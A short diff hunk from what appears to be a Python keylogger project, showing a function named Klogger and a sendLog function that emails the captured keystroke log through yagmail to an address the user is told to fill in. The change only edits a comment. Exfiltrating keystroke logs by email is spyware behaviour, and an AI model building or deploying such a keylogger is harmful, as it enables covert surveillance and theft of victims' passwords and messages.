@@ -42,7 +42,7 @@ def Klogger():
 
 ###############
 # Function using yagmail to send the log file
-# This email is open to testing purposes for the next 2 weeks
+# Replace the examples in the string with your info to receive the log
 ###############
 def sendLog(log):
     sender_email = "example@example.com" #Insert your email here
